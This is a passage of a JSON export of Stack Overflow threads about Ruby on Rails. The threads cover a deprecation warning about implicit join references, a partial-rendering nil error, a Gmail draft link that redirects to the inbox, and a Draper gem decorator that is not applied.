I&#39;m losing my mind trying to figure out what&#39;s going on as I have to scroll to see anything."}, {"owner": {"reputation": 27, "user_id": 9015753, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FBgLxZoC0ZM/AAAAAAAAAAI/AAAAAAAAAA4/5LUu-aEsX_0/photo.jpg?sz=128", "display_name": "Yehor Chumak", "link": "https://stackoverflow.com/users/9015753/yehor-chumak"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511811835, "post_id": 47515604, "comment_id": 81993413, "body": "problem comes from the line <code>masters = ProductMaster.includes(:product_master_names).where(&quot;...&quot;)</code> The warning i have tells:  <code>It looks like you are eager loading table(s)  that are referenced   in a string SQL snippet</code>  The warning also says i just need to <code>.references(:my_table)</code> for fix. But after adding this into that line, i receive <code>undefined method </code>references&#39; for #&lt;String:0x00000010f2c730&gt;`"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511812520, "post_id": 47515604, "comment_id": 81993776, "body": "Make sure you&#39;re chaining <code>references</code> on to the end of the scope and no to the string."}], "answers": [{"comments": [{"owner": {"reputation": 27, "user_id": 9015753, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FBgLxZoC0ZM/AAAAAAAAAAI/AAAAAAAAAA4/5LUu-aEsX_0/photo.jpg?sz=128", "display_name": "Yehor Chumak", "link": "https://stackoverflow.com/users/9015753/yehor-chumak"}, "edited": false, "score": 0, "creation_date": 1511854574, "post_id": 47518724, "comment_id": 82008293, "body": "I will be able to test in 4 hours, but it&#39;s strange for me. If you look at warning, you can see it gives me an example how to fiz, and reference is after string. Anyway, i will try, thx"}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "reply_to_user": {"reputation": 27, "user_id": 9015753, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FBgLxZoC0ZM/AAAAAAAAAAI/AAAAAAAAAA4/5LUu-aEsX_0/photo.jpg?sz=128", "display_name": "Yehor Chumak", "link": "https://stackoverflow.com/users/9015753/yehor-chumak"}, "edited": false, "score": 0, "creation_date": 1511854748, "post_id": 47518724, "comment_id": 82008378, "body": "The order is not important. You can chain the <code>reference</code> after the <code>where</code> too. But you called <code>reference</code> on an argument of the <code>where</code> call. And that led to the error <code>undefined method &#39;references&#39; for #&lt;String...</code>"}], "tags": [], "owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "is_accepted": true, "score": 1, "last_activity_date": 1511812149, "creation_date": 1511812149, "answer_id": 47518724, "question_id": 47515604, "link": "https://stackoverflow.com/questions/47515604/deprecation-warning-implicit-join-references-rails-dont-want-to-be-a-sql-pars/47518724#47518724", "title": "DEPRECATION WARNING: implicit join references. Rails don&#39;t want to be a SQL parser for includes", "body": "<p>Just chain <code>references</code> behind the <code>include</code> call instead of calling <code>reference</code> on a one of the parameter of <code>where</code>:</p>\n\n<pre><code>masters = ProductMaster\n  .includes(:product_master_names)\n  .references(:product_master_names)\n  .where(\n    # ...\n  )\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 9015753, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FBgLxZoC0ZM/AAAAAAAAAAI/AAAAAAAAAA4/5LUu-aEsX_0/photo.jpg?sz=128", "display_name": "Yehor Chumak", "link": "https://stackoverflow.com/users/9015753/yehor-chumak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 207, "favorite_count": 0, "accepted_answer_id": 47518724, "answer_count": 1, "score": 0, "last_activity_date": 1511812149, "creation_date": 1511800187, "question_id": 47515604, "link": "https://stackoverflow.com/questions/47515604/deprecation-warning-implicit-join-references-rails-dont-want-to-be-a-sql-pars", "title": "DEPRECATION WARNING: implicit join references. Rails don&#39;t want to be a SQL parser for includes", "body": "<p>I am upgrading an old app from rails3 to rails 4. Currently on rails 4.0</p>\n\n<p>I have a lot of such deprecation warnings while running rspec:</p>\n\n<pre><code>  Currently, Active Record recognizes the table in the string, and \nknows to JOIN the comments table to the query, rather than loading \ncomments in a separate query. However, doing this without writing a \nfull-blown SQL parser is inherently flawed. Since we don't want to \nwrite an SQL parser, we are removing this functionality. From now on, \nyou must explicitly tell Active Record when you are referencing a \ntable from a string:\n\nPost.includes(:comments).where(\"comments.title = \n'foo'\").references(:comments)\n\nIf you don't rely on implicit join references you can disable the \nfeature entirely by setting \n`config.active_record.disable_implicit_join_references = true`. \n\n DEPRECATION WARNING: It looks like you are eager loading table(s) \n (one of: product_masters, product_master_names) that are referenced \n in a string SQL snippet. For example: \n\nPost.includes(:comments).where(\"comments.title = 'foo'\")\n</code></pre>\n\n<p>Here is the lines that causing error</p>\n\n<pre><code>def find_product_master\n    masters = ProductMaster.includes(:product_master_names).where(\"gcc = 1 and crossed_product_master_id is null and product_masters.supplier_id is null &amp;&amp; (product_masters.slug = :name or product_masters.slug = :clean_name or product_master_names.slug = :name or product_master_names.slug = :clean_name) and product_masters.color = :color and (product_subfamily_id = :subfamily_id or second_product_subfamily_id = :subfamily_id)\", name: line.file_name.parameterize, clean_name: line.file_name.parameterize.gsub(\"chateau\",\"\").parameterize, color: line.file_color, subfamily_id: line.product_subfamily_id)\n    masters.size == 1 ? line.update_column(:product_master_id, masters.first.id) : line.update_column(:status, \"product_master_missing\")\nend\n</code></pre>\n\n<p>I tried like it was described in warning</p>\n\n<pre><code> def find_product_master\n    masters = ProductMaster.includes(:product_master_names).where(\"gcc = 1 and crossed_product_master_id is null and product_masters.supplier_id is null &amp;&amp; (product_masters.slug = :name or product_masters.slug = :clean_name or product_master_names.slug = :name or product_master_names.slug = :clean_name) and product_masters.color = :color and (product_subfamily_id = :subfamily_id or second_product_subfamily_id = :subfamily_id)\".references(:product_master_names), name: line.file_name.parameterize, clean_name: line.file_name.parameterize.gsub(\"chateau\",\"\").parameterize, color: line.file_color, subfamily_id: line.product_subfamily_id)\n    masters.size == 1 ? line.update_column(:product_master_id, masters.first.id) : line.update_column(:status, \"product_master_missing\")\n end\n</code></pre>\n\n<p>But then i received an error </p>\n\n<pre><code> NoMethodError:\n    undefined method `references' for #&lt;String:0x00000010f2c730&gt;\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 155, "user_id": 8733981, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sSUg7.png?s=128&g=1", "display_name": "rks", "link": "https://stackoverflow.com/users/8733981/rks"}, "edited": false, "score": 0, "creation_date": 1511799418, "post_id": 47515195, "comment_id": 81986475, "body": "you are sending part not @parts to your partial"}, {"owner": {"reputation": 19, "user_id": 6293547, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2545d1b4237cf1cc57c9b1ab8cf80b80?s=128&d=identicon&r=PG&f=1", "display_name": "Varri", "link": "https://stackoverflow.com/users/6293547/varri"}, "reply_to_user": {"reputation": 155, "user_id": 8733981, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sSUg7.png?s=128&g=1", "display_name": "rks", "link": "https://stackoverflow.com/users/8733981/rks"}, "edited": false, "score": 0, "creation_date": 1511800016, "post_id": 47515195, "comment_id": 81986860, "body": "@rajbir Do you mind explaining that to me? Because the way I was seeing it, :part just defined what kind of object it was expecting. Obviously that&#39;s not the case, because I just played around with it, and no matter what I change that to, it didn&#39;t affect the error that I Was getting."}, {"owner": {"reputation": 155, "user_id": 8733981, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sSUg7.png?s=128&g=1", "display_name": "rks", "link": "https://stackoverflow.com/users/8733981/rks"}, "edited": false, "score": 0, "creation_date": 1511801678, "post_id": 47515195, "comment_id": 81987939, "body": "I have added an answer, hope that helps"}], "answers": [{"tags": [], "owner": {"reputation": 351, "user_id": 5583496, "user_type": "registered", "profile_image": "https://graph.facebook.com/952848168094244/picture?type=large", "display_name": "Dima I. Belinski", "link": "https://stackoverflow.com/users/5583496/dima-i-belinski"}, "is_accepted": false, "score": 0, "last_activity_date": 1511800147, "last_edit_date": 1511800147, "creation_date": 1511799487, "answer_id": 47515370, "question_id": 47515195, "link": "https://stackoverflow.com/questions/47515195/undefined-method-each-for-nilnilclass-while-attempting-to-use-a-partial/47515370#47515370", "title": "undefined method `each&#39; for nil:NilClass while attempting to use a partial", "body": "<p>you provide to <code>_index.html.erb</code> variable part but try to render @parts.\n1. you don't need method _index, when your patial <code>_index.html.erb</code> render that not get variable @parts from method <code>_index</code>. I think it's wrong.\n2. You need to render in <code>_index.html.erb</code> variable which it's provided from <code>_form</code></p>\n\n<pre><code>&lt;% part.each do |part_| %&gt;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 19, "user_id": 6293547, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2545d1b4237cf1cc57c9b1ab8cf80b80?s=128&d=identicon&r=PG&f=1", "display_name": "Varri", "link": "https://stackoverflow.com/users/6293547/varri"}, "edited": false, "score": 0, "creation_date": 1511930056, "post_id": 47516056, "comment_id": 82047094, "body": "Sorry about not replying, I had to get back to work right after I posted this. It seems that wasn&#39;t the issue, so I&#39;m still not sure. It might be an issue with how my database is structured, since it still returns nil."}, {"owner": {"reputation": 19, "user_id": 6293547, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2545d1b4237cf1cc57c9b1ab8cf80b80?s=128&d=identicon&r=PG&f=1", "display_name": "Varri", "link": "https://stackoverflow.com/users/6293547/varri"}, "edited": false, "score": 0, "creation_date": 1511931700, "post_id": 47516056, "comment_id": 82047529, "body": "Well it appears this did fix the issue after restarting the rails server. Thank you so much man!"}], "tags": [], "owner": {"reputation": 155, "user_id": 8733981, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sSUg7.png?s=128&g=1", "display_name": "rks", "link": "https://stackoverflow.com/users/8733981/rks"}, "is_accepted": true, "score": 0, "last_activity_date": 1511801634, "creation_date": 1511801634, "answer_id": 47516056, "question_id": 47515195, "link": "https://stackoverflow.com/questions/47515195/undefined-method-each-for-nilnilclass-while-attempting-to-use-a-partial/47516056#47516056", "title": "undefined method `each&#39; for nil:NilClass while attempting to use a partial", "body": "<p>so here is the problem: </p>\n\n<pre><code>&lt;%= render :partial =&gt; \"parts/index\" , :part =&gt; @parts %&gt;\n</code></pre>\n\n<p>you are sending :part to your _index.html.erb partial while using @parts</p>\n\n<p>you need to update your render call to following:</p>\n\n<pre><code>&lt;%= render :partial =&gt; \"parts/index\" , locals: {parts: @parts}%&gt;\n</code></pre>\n\n<p>and your loop to:</p>\n\n<pre><code>&lt;% parts.each do |part| %&gt;\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 6293547, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2545d1b4237cf1cc57c9b1ab8cf80b80?s=128&d=identicon&r=PG&f=1", "display_name": "Varri", "link": "https://stackoverflow.com/users/6293547/varri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 191, "favorite_count": 0, "accepted_answer_id": 47516056, "answer_count": 2, "score": 0, "last_activity_date": 1511801634, "creation_date": 1511798902, "question_id": 47515195, "link": "https://stackoverflow.com/questions/47515195/undefined-method-each-for-nilnilclass-while-attempting-to-use-a-partial", "title": "undefined method `each&#39; for nil:NilClass while attempting to use a partial", "body": "<p>I'm currently having the issue for when I try to use a partial inside of invoices/_form.html.erb, it goes into parts/_index.html.erb and breaks.</p>\n\n<p>Inside of the parts_controller I have:</p>\n\n<pre><code>def _index\n  @parts = Part.all\nend\n#unsure if this is needed\n</code></pre>\n\n<p>Inside of invoices_controller I have:`  </p>\n\n<pre><code>def new\n  @invoice = Invoice.new\n  @parts = Part.all\nend`\n</code></pre>\n\n<p>Inside of invoices/_form.html.erb I have:</p>\n\n<pre><code>  &lt;%= render :partial =&gt; \"parts/index\" , :part =&gt; @parts %&gt;\n</code></pre>\n\n<p>And inside of invoices/new.html.erb I have:</p>\n\n<pre><code>&lt;h1 style=\"padding-left:120px\"&gt;New Invoice&lt;/h1&gt;\n\n&lt;%= render 'form', invoice: @invoice, part: @parts %&gt;\n\n&lt;%= link_to 'Back', invoices_path, class: \"btn btn-default col-md-2\" %&gt;\n</code></pre>\n\n<p>So what this code is attempting to do is display the index page of parts so the user is able to see all current parts they have in stock, and how many of that part is in stock. The parts/index page is the exact same as the the default index page for parts, but it just has a link removed.</p>\n\n<p>The line of code that gives me an issue in parts/index is:</p>\n\n<pre><code> &lt;% @parts.each do |part| %&gt;\n</code></pre>\n\n<p>And what's confusing me about that is that I should be passing it an object that has data inside of it, since it's declared in both the controller for parts, and the invoice controller. Am I missing something super simple with my syntax, or is what I'm trying to do not the right way to do it? I'm still a noob to rails, so sorry if what I'm trying to get across doesn't make too much sense.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "gmail"], "comments": [{"owner": {"reputation": 11, "user_id": 7015851, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc29581a8fda0f73760829c77feb512e?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/7015851/kyle"}, "edited": false, "score": 0, "creation_date": 1511800980, "post_id": 47514782, "comment_id": 81987487, "body": "Tried this on multiple browsers and get the same issue. It always redirects to the inbox rather than the draft. May be something on Gmail itself?"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1511804822, "post_id": 47514782, "comment_id": 81989766, "body": "I&#39;d be really careful when trying to URL-hack a solution here. Google can and will change their parameter names without warning as well as the names of their endpoints."}], "owner": {"reputation": 11, "user_id": 7015851, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc29581a8fda0f73760829c77feb512e?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/7015851/kyle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 49, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1511797601, "creation_date": 1511797601, "question_id": 47514782, "link": "https://stackoverflow.com/questions/47514782/link-to-gmail-draft-now-goes-to-inbox", "title": "Link to Gmail draft now goes to inbox", "body": "<p>Starting recently, a link from our site that is supposed to open a draft in Gmail will now redirect to the inbox instead. The draft still exists, and can be navigated to through Gmail, but that extra step is causing delays in our company that relies heavily on sending emails to clients. The code based around it is:</p>\n\n<pre><code>def draft_url\n   return nil unless from_address\n\n    unless gmail_message_id\n      draft = query_gmail_draft\n      self.gmail_message_id = draft&amp;.message&amp;.id\n    end\n\n    return nil unless gmail_message_id\n    \"https://accounts.google.com/ServiceLogin?service=mail&amp;passive=true&amp;Email=#{from_address}&amp;continue=https://mail.google.com/mail/u/#{from_address}/%23drafts?compose=#{gmail_message_id}\"\nend\n</code></pre>\n\n<p>The first part is authentication, but the last link is what takes you to the draft. We did recently update to the newest version of Chrome, but I didn't see anything in the notes that would suggest a change in regard to this.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rubygems"], "comments": [{"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511798024, "post_id": 47514549, "comment_id": 81985570, "body": "Can you post your models?"}, {"owner": {"reputation": 89, "user_id": 5790261, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/225b212bb482ad5456e4fa6a1a43593a?s=128&d=identicon&r=PG", "display_name": "Steve", "link": "https://stackoverflow.com/users/5790261/steve"}, "reply_to_user": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511798718, "post_id": 47514549, "comment_id": 81985997, "body": "Sure @xeon131! These are trimmed down versions -  <code>module Admin</code>   <code>class Order &lt; ActiveRecord::Base</code>     <code>has_many :line_items</code>   <code>end</code> <code>end</code>  <code>module Admin</code>    <code>class LineItem &lt; ActiveRecord::Base</code>      <code>belongs_to :order</code>    <code>end</code>  <code>end</code>"}], "answers": [{"comments": [{"owner": {"reputation": 89, "user_id": 5790261, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/225b212bb482ad5456e4fa6a1a43593a?s=128&d=identicon&r=PG", "display_name": "Steve", "link": "https://stackoverflow.com/users/5790261/steve"}, "edited": false, "score": 0, "creation_date": 1511799498, "post_id": 47515307, "comment_id": 81986535, "body": "I could have sworn I tried that, but I think I was getting another error that was unrelated. At any rate, I&#39;ve changed it per your recommendation and it is working now. Thank you!"}], "tags": [], "owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "is_accepted": true, "score": 1, "last_activity_date": 1511799272, "creation_date": 1511799272, "answer_id": 47515307, "question_id": 47514549, "link": "https://stackoverflow.com/questions/47514549/draper-gem-not-decorating-associated-model/47515307#47515307", "title": "Draper gem not decorating associated model", "body": "<p>I think you need to use plural <code>line_items</code> not singular <code>line_item</code> to make it work because that is how your association is named.</p>\n\n<pre><code> decorates_association :line_items\n</code></pre>\n"}], "owner": {"reputation": 89, "user_id": 5790261, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/225b212bb482ad5456e4fa6a1a43593a?s=128&d=identicon&r=PG", "display_name": "Steve", "link": "https://stackoverflow.com/users/5790261/steve"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 540, "favorite_count": 0, "accepted_answer_id": 47515307, "answer_count": 1, "score": 0, "last_activity_date": 1511799272, "creation_date": 1511796784, "question_id": 47514549, "link": "https://stackoverflow.com/questions/47514549/draper-gem-not-decorating-associated-model", "title": "Draper gem not decorating associated model", "body": "<p>I'm following the Draper gem documentation, but the associated model is not being decorated. Here's a snippet of my top-level decorator:</p>\n\n<pre><code>module Admin\n  class OrderDecorator &lt; Draper::Decorator\n    delegate_all\n    decorates_finders\n    decorates_association :line_item\n\n    def amount\n      model.amount.nil? ? 0 : model.amount\n    end\n  end\nend\n</code></pre>\n\n<p>And here's a snippet from my association decorator:</p>\n\n<pre><code>module Admin\n  class LineItemDecorator &lt; Draper::Decorator\n    delegate_all\n\n    def options\n      model.options.present? ? model.options.to_s : 'N/A'\n    end\n  end\nend\n</code></pre>\n\n<p>Here's the method in the controller that calls the decorator:</p>\n\n<pre><code>  def show\n    @subject = Admin::OrderDecorator.find(params[:id])\n  end\n</code></pre>\n\n<p>It's being used in the view like so:</p>\n\n<pre><code>@subject.line_items.each do |li|\n  = li.options\n</code></pre>\n\n<p>...etc...</p>\n\n<p>The options method on LineItemDecorator is just being ignored - if it's nil, it doesn't display anything, rather than 'N/A'. I've put binding.pry in the options method and it never gets called. Can anyone see what I'm missing?</p>\n\n<p>Thanks so much in advance.</p>\n"}]